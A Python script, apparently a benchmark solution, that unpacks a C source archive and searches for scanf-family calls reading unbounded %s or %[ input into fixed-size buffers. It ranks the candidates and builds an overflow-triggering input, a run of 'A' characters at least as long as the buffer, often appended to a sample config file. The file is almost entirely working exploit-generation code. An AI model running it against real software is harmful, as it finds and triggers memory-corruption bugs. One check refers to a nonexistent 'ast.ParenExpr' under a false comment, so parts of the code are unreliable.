import os
import re
import tarfile
import zipfile
import tempfile
import ast
from typing import Dict, List, Optional, Tuple


def _safe_int_eval(expr: str, names: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = re.sub(r"//.*?$", "", expr, flags=re.M)
    expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.S)

    try:
        node = ast.parse(expr, mode="eval")
    except Exception:
        return None

    def _eval(n):
        if isinstance(n, ast.Expression):
            return _eval(n.body)
        if isinstance(n, ast.Constant):
            if isinstance(n.value, (int, float)):
                return int(n.value)
            if isinstance(n.value, str):
                s = n.value.strip()
                if s.isdigit():
                    return int(s)
                return None
            return None
        if isinstance(n, ast.Num):
            return int(n.n)
        if isinstance(n, ast.Name):
            return names.get(n.id, None)
        if isinstance(n, ast.UnaryOp):
            v = _eval(n.operand)
            if v is None:
                return None
            if isinstance(n.op, ast.UAdd):
                return int(v)
            if isinstance(n.op, ast.USub):
                return -int(v)
            if isinstance(n.op, ast.Invert):
                return ~int(v)
            return None
        if isinstance(n, ast.BinOp):
            a = _eval(n.left)
            b = _eval(n.right)
            if a is None or b is None:
                return None
            if isinstance(n.op, ast.Add):
                return a + b
            if isinstance(n.op, ast.Sub):
                return a - b
            if isinstance(n.op, ast.Mult):
                return a * b
            if isinstance(n.op, (ast.Div, ast.FloorDiv)):
                if b == 0:
                    return None
                return a // b
            if isinstance(n.op, ast.Mod):
                if b == 0:
                    return None
                return a % b
            if isinstance(n.op, ast.LShift):
                return a << b
            if isinstance(n.op, ast.RShift):
                return a >> b
            if isinstance(n.op, ast.BitOr):
                return a | b
            if isinstance(n.op, ast.BitAnd):
                return a & b
            if isinstance(n.op, ast.BitXor):
                return a ^ b
            return None
        if isinstance(n, ast.ParenExpr):  # pragma: no cover (py<3.12 doesn't have)
            return _eval(n.value)
        return None

    try:
        v = _eval(node)
    except Exception:
        return None
    if v is None:
        return None
    try:
        return int(v)
    except Exception:
        return None


def _decode_c_string_literal(lit: str) -> str:
    s = lit
    if s.startswith('"') and s.endswith('"'):
        s = s[1:-1]
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != '\\':
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        e = s[i]
        i += 1
        if e == 'n':
            out.append('\n')
        elif e == 'r':
            out.append('\r')
        elif e == 't':
            out.append('\t')
        elif e == 'v':
            out.append('\v')
        elif e == 'b':
            out.append('\b')
        elif e == 'a':
            out.append('\a')
        elif e == 'f':
            out.append('\f')
        elif e == '\\':
            out.append('\\')
        elif e == '"':
            out.append('"')
        elif e == "'":
            out.append("'")
        elif e == '0':
            j = i
            while j < n and len(s[i:j]) < 3 and s[j] in '01234567':
                j += 1
            oct_digits = s[i:j]
            if oct_digits:
                try:
                    out.append(chr(int(oct_digits, 8)))
                except Exception:
                    out.append('\x00')
                i = j
            else:
                out.append('\x00')
        elif e in '1234567':
            j = i
            while j < n and (j - (i - 1)) < 3 and s[j] in '01234567':
                j += 1
            oct_digits = s[i - 1:j]
            try:
                out.append(chr(int(oct_digits, 8)))
            except Exception:
                out.append('A')
            i = j
        elif e == 'x':
            j = i
            hx = []
            while j < n and len(hx) < 2 and s[j] in '0123456789abcdefABCDEF':
                hx.append(s[j])
                j += 1
            if hx:
                try:
                    out.append(chr(int(''.join(hx), 16)))
                except Exception:
                    out.append('A')
                i = j
            else:
                out.append('x')
        else:
            out.append(e)
    return ''.join(out)


_STR_LIT_RE = re.compile(r'"(?:\\.|[^"\\])*"')


def _extract_c_string_expr(expr: str) -> Optional[str]:
    pieces = _STR_LIT_RE.findall(expr)
    if not pieces:
        return None
    tmp = _STR_LIT_RE.sub('', expr)
    tmp = re.sub(r'\s+', '', tmp)
    tmp = tmp.replace('(', '').replace(')', '')
    if tmp not in ('',):
        return None
    return ''.join(_decode_c_string_literal(p) for p in pieces)


def _scan_to_matching_paren(text: str, open_paren_idx: int) -> Optional[int]:
    depth = 0
    i = open_paren_idx
    n = len(text)
    in_str = False
    in_chr = False
    in_line_comment = False
    in_block_comment = False
    esc = False
    while i < n:
        c = text[i]
        nxt = text[i + 1] if i + 1 < n else ''
        if in_line_comment:
            if c == '\n':
                in_line_comment = False
            i += 1
            continue
        if in_block_comment:
            if c == '*' and nxt == '/':
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue
        if in_str:
            if esc:
                esc = False
                i += 1
                continue
            if c == '\\':
                esc = True
                i += 1
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            if esc:
                esc = False
                i += 1
                continue
            if c == '\\':
                esc = True
                i += 1
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == '/' and nxt == '/':
            in_line_comment = True
            i += 2
            continue
        if c == '/' and nxt == '*':
            in_block_comment = True
            i += 2
            continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        if c == '(':
            depth += 1
        elif c == ')':
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return None


def _split_top_level_commas(s: str) -> List[str]:
    parts = []
    cur = []
    depth_par = 0
    depth_br = 0
    depth_curly = 0
    in_str = False
    in_chr = False
    in_line_comment = False
    in_block_comment = False
    esc = False
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        nxt = s[i + 1] if i + 1 < n else ''
        if in_line_comment:
            cur.append(c)
            if c == '\n':
                in_line_comment = False
            i += 1
            continue
        if in_block_comment:
            cur.append(c)
            if c == '*' and nxt == '/':
                cur.append(nxt)
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue
        if in_str:
            cur.append(c)
            if esc:
                esc = False
                i += 1
                continue
            if c == '\\':
                esc = True
                i += 1
                continue
            if c == '"':
                in_str = False
            i += 1
            continue
        if in_chr:
            cur.append(c)
            if esc:
                esc = False
                i += 1
                continue
            if c == '\\':
                esc = True
                i += 1
                continue
            if c == "'":
                in_chr = False
            i += 1
            continue

        if c == '/' and nxt == '/':
            in_line_comment = True
            cur.append(c)
            cur.append(nxt)
            i += 2
            continue
        if c == '/' and nxt == '*':
            in_block_comment = True
            cur.append(c)
            cur.append(nxt)
            i += 2
            continue
        if c == '"':
            in_str = True
            cur.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            cur.append(c)
            i += 1
            continue

        if c == '(':
            depth_par += 1
        elif c == ')':
            if depth_par > 0:
                depth_par -= 1
        elif c == '[':
            depth_br += 1
        elif c == ']':
            if depth_br > 0:
                depth_br -= 1
        elif c == '{':
            depth_curly += 1
        elif c == '}':
            if depth_curly > 0:
                depth_curly -= 1

        if c == ',' and depth_par == 0 and depth_br == 0 and depth_curly == 0:
            parts.append(''.join(cur).strip())
            cur = []
            i += 1
            continue

        cur.append(c)
        i += 1
    if cur:
        parts.append(''.join(cur).strip())
    return parts


def _simple_ident(expr: str) -> Optional[str]:
    e = expr.strip()
    e = re.sub(r'\s+', ' ', e).strip()
    e = re.sub(r'^\((?:[^()"]+)\)\s*', '', e).strip()
    m = re.match(r'^\s*&?\s*\(?\s*([A-Za-z_]\w*)\s*\)?\s*$', e)
    if m:
        return m.group(1)
    m = re.match(r'^\s*&?\s*([A-Za-z_]\w*)\s*\[\s*0\s*\]\s*$', e)
    if m:
        return m.group(1)
    return None


class _Conv:
    __slots__ = ("spec", "assign", "width", "bounded", "assign_index", "raw")

    def __init__(self, spec: str, assign: bool, width: Optional[int], bounded: bool, assign_index: Optional[int], raw: str):
        self.spec = spec
        self.assign = assign
        self.width = width
        self.bounded = bounded
        self.assign_index = assign_index
        self.raw = raw


def _parse_format_conversions(fmt: str) -> List[_Conv]:
    convs: List[_Conv] = []
    i = 0
    n = len(fmt)
    assign_count = 0
    while i < n:
        if fmt[i] != '%':
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == '%':
            i += 2
            continue
        j = i + 1
        assign = True
        if j < n and fmt[j] == '*':
            assign = False
            j += 1
        width = None
        width_start = j
        while j < n and fmt[j].isdigit():
            j += 1
        if j > width_start:
            try:
                width = int(fmt[width_start:j])
            except Exception:
                width = None
        bounded = width is not None

        if j < n and fmt[j] in 'hljztL':
            if fmt[j] in 'hl' and j + 1 < n and fmt[j + 1] == fmt[j]:
                j += 2
            else:
                j += 1
            while j < n and fmt[j] in 'hljztL':
                j += 1

        spec = ''
        raw_start = i
        if j < n and fmt[j] == '[':
            k = j + 1
            if k < n and fmt[k] == '^':
                k += 1
            if k < n and fmt[k] == ']':
                k += 1
            while k < n and fmt[k] != ']':
                k += 1
            if k < n and fmt[k] == ']':
                k += 1
            spec = '['
            raw = fmt[raw_start:k]
            convs.append(_Conv(spec, assign, width, bounded, assign_count if assign else None, raw))
            if assign:
                assign_count += 1
            i = k
            continue
        if j < n:
            spec = fmt[j]
            raw = fmt[raw_start:j + 1]
            convs.append(_Conv(spec, assign, width, bounded, assign_count if assign else None, raw))
            if assign:
                assign_count += 1
            i = j + 1
            continue
        i += 1
    return convs


def _build_input_from_format(fmt: str, convs: List[_Conv], tokens_by_conv_index: Dict[int, str]) -> str:
    out = []
    i = 0
    n = len(fmt)
    conv_i = 0

    def _emit_space():
        if not out:
            return
        if out[-1] and out[-1][-1].isspace():
            return
        out.append(' ')

    while i < n:
        c = fmt[i]
        if c == '%':
            if i + 1 < n and fmt[i + 1] == '%':
                out.append('%')
                i += 2
                continue
            if conv_i >= len(convs):
                i += 1
                continue
            conv = convs[conv_i]
            spec = conv.spec
            tok = tokens_by_conv_index.get(conv_i)
            if spec in ('d', 'i', 'u', 'x', 'X', 'o'):
                out.append(tok if tok is not None else '0')
            elif spec in ('f', 'F', 'e', 'E', 'g', 'G', 'a', 'A'):
                out.append(tok if tok is not None else '0')
            elif spec == 'c':
                w = conv.width if conv.width is not None and conv.width > 0 else 1
                t = tok if tok is not None else 'A'
                if len(t) < w:
                    t = (t + ('A' * w))[:w]
                out.append(t[:w])
            elif spec in ('s', '['):
                out.append(tok if tok is not None else 'A')
            elif spec == 'p':
                out.append(tok if tok is not None else '0')
            else:
                out.append(tok if tok is not None else 'A')

            end_i = i + len(conv.raw)
            i = end_i
            conv_i += 1
            continue

        if c.isspace():
            _emit_space()
            while i < n and fmt[i].isspace():
                i += 1
            continue

        out.append(c)
        i += 1

    s = ''.join(out)
    if not s.endswith('\n'):
        s += '\n'
    return s


def _extract_defines(text: str) -> Dict[str, str]:
    defines: Dict[str, str] = {}
    for m in re.finditer(r'^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)[ \t]+(.+?)\s*$', text, flags=re.M):
        name = m.group(1)
        val = m.group(2).strip()
        if '(' in name:
            continue
        if val.endswith('\\'):
            continue
        if any(x in val for x in ('"', "'", '{', '}', ';')):
            continue
        val = re.sub(r'\s+', ' ', val).strip()
        defines[name] = val
    return defines


def _resolve_defines(defines: Dict[str, str]) -> Dict[str, int]:
    resolved: Dict[str, int] = {}
    for _ in range(30):
        progress = False
        for k, v in list(defines.items()):
            if k in resolved:
                continue
            val = v
            if re.search(r'\bdefined\s*\(', val):
                continue
            outv = _safe_int_eval(val, resolved)
            if outv is None:
                continue
            resolved[k] = int(outv)
            progress = True
        if not progress:
            break
    return resolved


def _find_array_size(lines: List[str], var: str, upto_line_idx: int, resolved_defines: Dict[str, int]) -> Optional[int]:
    pat = re.compile(r'\bchar\s+' + re.escape(var) + r'\s*\[\s*([^\]]+)\s*\]\s*;')
    pat2 = re.compile(r'\bunsigned\s+char\s+' + re.escape(var) + r'\s*\[\s*([^\]]+)\s*\]\s*;')
    pat3 = re.compile(r'\buint8_t\s+' + re.escape(var) + r'\s*\[\s*([^\]]+)\s*\]\s*;')
    start = max(0, upto_line_idx - 250)
    for i in range(upto_line_idx, start - 1, -1):
        ln = lines[i]
        m = pat.search(ln) or pat2.search(ln) or pat3.search(ln)
        if not m:
            continue
        expr = m.group(1).strip()
        expr = re.sub(r'\s+', ' ', expr)
        if expr.isdigit():
            try:
                return int(expr)
            except Exception:
                return None
        v = _safe_int_eval(expr, resolved_defines)
        if v is not None and v > 0:
            return int(v)
    return None


def _find_best_key_constant(context: str, keyvar: str) -> Optional[str]:
    if not keyvar:
        return None
    keyvar_esc = re.escape(keyvar)
    lits = []
    for rx in (
        r'strcmp\s*\(\s*' + keyvar_esc + r'\s*,\s*"([^"]+)"\s*\)',
        r'strcmp\s*\(\s*"([^"]+)"\s*,\s*' + keyvar_esc + r'\s*\)',
        r'strncmp\s*\(\s*' + keyvar_esc + r'\s*,\s*"([^"]+)"\s*,',
        r'strncmp\s*\(\s*"([^"]+)"\s*,\s*' + keyvar_esc + r'\s*,',
    ):
        for m in re.finditer(rx, context):
            lits.append(m.group(1))
    if not lits:
        return None
    def _score(s: str) -> int:
        ls = s.lower()
        sc = 0
        if 'hex' in ls:
            sc += 50
        if 'key' in ls:
            sc += 20
        if 'hash' in ls:
            sc += 10
        if 'mac' in ls:
            sc += 10
        if 'id' in ls:
            sc += 5
        sc -= len(s) // 10
        return sc
    lits.sort(key=_score, reverse=True)
    return lits[0]


class _Candidate:
    __slots__ = ("path", "func", "fmt", "convs", "target_conv_index", "dest_var", "dest_size", "key_var", "score", "pos", "line_no")

    def __init__(self, path: str, func: str, fmt: str, convs: List[_Conv], target_conv_index: int,
                 dest_var: str, dest_size: int, key_var: Optional[str], score: int, pos: int, line_no: int):
        self.path = path
        self.func = func
        self.fmt = fmt
        self.convs = convs
        self.target_conv_index = target_conv_index
        self.dest_var = dest_var
        self.dest_size = dest_size
        self.key_var = key_var
        self.score = score
        self.pos = pos
        self.line_no = line_no


def _is_text_like(b: bytes) -> bool:
    if not b:
        return False
    if b'\x00' in b:
        return False
    printable = sum((32 <= c <= 126) or c in (9, 10, 13) for c in b[:4096])
    return printable / max(1, min(len(b), 4096)) > 0.85


def _collect_config_samples(root: str) -> List[Tuple[str, bytes]]:
    samples = []
    exts = {'.conf', '.cfg', '.ini', '.cnf', '.config'}
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            lower = fn.lower()
            _, ext = os.path.splitext(lower)
            if ext not in exts and ('config' not in lower and 'conf' not in lower and 'cfg' not in lower and 'ini' not in lower and 'sample' not in lower and 'example' not in lower):
                continue
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 8192:
                continue
            try:
                data = open(p, 'rb').read()
            except Exception:
                continue
            if not _is_text_like(data):
                continue
            if b'=' not in data and b':' not in data and b'[' not in data:
                continue
            samples.append((p, data))
    samples.sort(key=lambda x: len(x[1]))
    return samples


def _collect_source_files(root: str) -> List[str]:
    out = []
    exts = {'.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh'}
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            lower = fn.lower()
            _, ext = os.path.splitext(lower)
            if ext in exts:
                p = os.path.join(dirpath, fn)
                try:
                    if os.stat(p).st_size > 2_000_000:
                        continue
                except Exception:
                    continue
                out.append(p)
    return out


def _find_candidates_in_file(path: str, text: str) -> List[_Candidate]:
    candidates: List[_Candidate] = []
    lower_path = path.lower()
    path_bonus = 0
    if any(k in lower_path for k in ('config', 'cfg', 'conf', 'ini')):
        path_bonus += 30
    if any(k in lower_path for k in ('parse', 'reader', 'load')):
        path_bonus += 10

    defines = _extract_defines(text)
    resolved_defines = _resolve_defines(defines)
    lines = text.splitlines()

    for m in re.finditer(r'\b(sscanf|fscanf|scanf)\s*\(', text):
        func = m.group(1)
        open_idx = text.find('(', m.end() - 1)
        if open_idx < 0:
            continue
        close_idx = _scan_to_matching_paren(text, open_idx)
        if close_idx is None:
            continue
        call_args_str = text[open_idx + 1:close_idx]
        args = _split_top_level_commas(call_args_str)
        if not args:
            continue

        fmt_expr = None
        fmt_idx = None
        if func == 'sscanf':
            if len(args) < 2:
                continue
            fmt_expr = args[1]
            fmt_idx = 1
        elif func == 'fscanf':
            if len(args) < 2:
                continue
            fmt_expr = args[1]
            fmt_idx = 1
        else:
            fmt_expr = args[0]
            fmt_idx = 0

        fmt = _extract_c_string_expr(fmt_expr)
        if fmt is None:
            continue

        convs = _parse_format_conversions(fmt)
        if not convs:
            continue

        assigned_args = args[fmt_idx + 1:]
        assign_count = sum(1 for c in convs if c.assign)
        if assign_count > len(assigned_args):
            continue

        context_start = max(0, m.start() - 2500)
        context_end = min(len(text), close_idx + 2500)
        context = text[context_start:context_end].lower()
        context_score = 0
        if 'config' in context or 'cfg' in context or 'ini' in context:
            context_score += 20
        if 'hex' in context:
            context_score += 25
        if '0x' in context:
            context_score += 10

        key_var = None
        for c in convs:
            if c.assign and c.spec in ('s', '[', 'c'):
                ai = c.assign_index
                if ai is None or ai >= len(assigned_args):
                    continue
                v = _simple_ident(assigned_args[ai])
                if v:
                    key_var = v
                    break

        line_no = text.count('\n', 0, m.start()) + 1

        for conv_index, c in enumerate(convs):
            if not c.assign:
                continue
            if c.spec not in ('s', '['):
                continue
            if c.bounded:
                continue
            ai = c.assign_index
            if ai is None or ai >= len(assigned_args):
                continue
            dest_expr = assigned_args[ai]
            dest_var = _simple_ident(dest_expr)
            if not dest_var:
                continue
            dest_size = _find_array_size(lines, dest_var, min(len(lines) - 1, max(0, line_no - 1)), resolved_defines)
            if dest_size is None or dest_size <= 1:
                continue

            fmt_l = fmt.lower()
            sc = 0
            sc += path_bonus + context_score
            if func == 'sscanf':
                sc += 25
            elif func == 'fscanf':
                sc -= 5
            else:
                sc -= 10
            if 'hex' in fmt_l:
                sc += 45
            if '0x' in fmt_l:
                sc += 25
            if dest_var.lower().find('hex') != -1:
                sc += 35
            if dest_var.lower().find('key') != -1:
                sc += 10
            if dest_var.lower().find('hash') != -1:
                sc += 10
            sc += max(0, 80 - min(dest_size, 80))  # favor smaller buffers
            sc -= min(200, dest_size // 4)

            input_arg_expr = args[0].strip() if func == 'sscanf' else None
            if func == 'sscanf' and input_arg_expr:
                line_var = _simple_ident(input_arg_expr)
                if line_var:
                    pre_context = text[max(0, m.start() - 8000):m.start()]
                    if re.search(r'\bfgets\s*\(\s*' + re.escape(line_var) + r'\s*,', pre_context):
                        sc += 35
                    if re.search(r'\bgetline\s*\(\s*&\s*' + re.escape(line_var) + r'\s*,', pre_context):
                        sc += 35

            candidates.append(_Candidate(
                path=path,
                func=func,
                fmt=fmt,
                convs=convs,
                target_conv_index=conv_index,
                dest_var=dest_var,
                dest_size=dest_size,
                key_var=key_var,
                score=sc,
                pos=m.start(),
                line_no=line_no
            ))
    return candidates


def _extract_root_from_src(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    return src_path


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            root = None
            if os.path.isdir(src_path):
                root = src_path
            else:
                extracted = False
                try:
                    with tarfile.open(src_path, 'r:*') as tf:
                        tf.extractall(td)
                        extracted = True
                except Exception:
                    extracted = False
                if not extracted:
                    try:
                        with zipfile.ZipFile(src_path, 'r') as zf:
                            zf.extractall(td)
                            extracted = True
                    except Exception:
                        extracted = False
                root = td if extracted else src_path

            source_files = _collect_source_files(root)
            all_candidates: List[_Candidate] = []
            for p in source_files:
                try:
                    data = open(p, 'rb').read()
                except Exception:
                    continue
                if not _is_text_like(data):
                    continue
                try:
                    text = data.decode('utf-8', errors='ignore')
                except Exception:
                    continue
                if 'sscanf' not in text and 'fscanf' not in text and 'scanf' not in text:
                    continue
                all_candidates.extend(_find_candidates_in_file(p, text))

            best = None
            if all_candidates:
                all_candidates.sort(key=lambda c: (c.score, -c.dest_size), reverse=True)
                best = all_candidates[0]

            if best is None:
                token_len = 544
                if token_len % 2 == 1:
                    token_len += 1
                token = ('A' * token_len)
                s = "hex=" + token + "\n"
                return s.encode('ascii', errors='ignore')

            token_len = best.dest_size
            if token_len < 8:
                token_len = 8
            if token_len % 2 == 1:
                token_len += 1
            token = 'A' * token_len

            tokens_by_conv: Dict[int, str] = {}
            tokens_by_conv[best.target_conv_index] = token

            key_const = None
            try:
                with open(best.path, 'rb') as f:
                    ftext = f.read().decode('utf-8', errors='ignore')
            except Exception:
                ftext = ""

            if best.key_var:
                window_start = max(0, best.pos - 6000)
                window_end = min(len(ftext), best.pos + 6000)
                key_const = _find_best_key_constant(ftext[window_start:window_end], best.key_var)
                if key_const is None:
                    key_const = "hex"

            if key_const and best.key_var:
                fmt = best.fmt
                convs = best.convs
                mpos = re.search(r'\b' + re.escape(best.func) + r'\s*\(', ftext[best.pos:best.pos + 50] if ftext else '')
                # Map assigned conversion args to variables (best effort) for keyvar matching
                # Re-parse the call near best.pos to recover arg list
                call_pos = None
                if ftext:
                    mm = re.search(r'\b' + re.escape(best.func) + r'\s*\(', ftext)
                    if mm:
                        # find match closest to best.pos
                        best_dist = None
                        for mm2 in re.finditer(r'\b' + re.escape(best.func) + r'\s*\(', ftext):
                            d = abs(mm2.start() - best.pos)
                            if best_dist is None or d < best_dist:
                                best_dist = d
                                call_pos = mm2.start()
                assigned_vars_by_assign_index: Dict[int, str] = {}
                if call_pos is not None:
                    open_idx = ftext.find('(', call_pos)
                    close_idx = _scan_to_matching_paren(ftext, open_idx) if open_idx >= 0 else None
                    if close_idx is not None:
                        call_args_str = ftext[open_idx + 1:close_idx]
                        args = _split_top_level_commas(call_args_str)
                        fmt_idx = 1 if best.func in ('sscanf', 'fscanf') else 0
                        if len(args) > fmt_idx:
                            assigned_args = args[fmt_idx + 1:]
                            for c in convs:
                                if not c.assign or c.assign_index is None:
                                    continue
                                if c.assign_index < len(assigned_args):
                                    v = _simple_ident(assigned_args[c.assign_index])
                                    if v:
                                        assigned_vars_by_assign_index[c.assign_index] = v

                for ci, c in enumerate(convs):
                    if ci == best.target_conv_index:
                        continue
                    if c.spec not in ('s', '[', 'c'):
                        continue
                    if not c.assign or c.assign_index is None:
                        continue
                    v = assigned_vars_by_assign_index.get(c.assign_index)
                    if v == best.key_var:
                        tokens_by_conv[ci] = key_const

            line = _build_input_from_format(best.fmt, best.convs, tokens_by_conv)

            samples = _collect_config_samples(root)
            if samples:
                base = samples[0][1]
                try:
                    base_text = base.decode('utf-8', errors='ignore')
                except Exception:
                    base_text = ""
                if base_text and len(base_text) <= 4096:
                    if not base_text.endswith('\n'):
                        base_text += '\n'
                    poc = (base_text + line).encode('utf-8', errors='ignore')
                    return poc

            return line.encode('ascii', errors='ignore')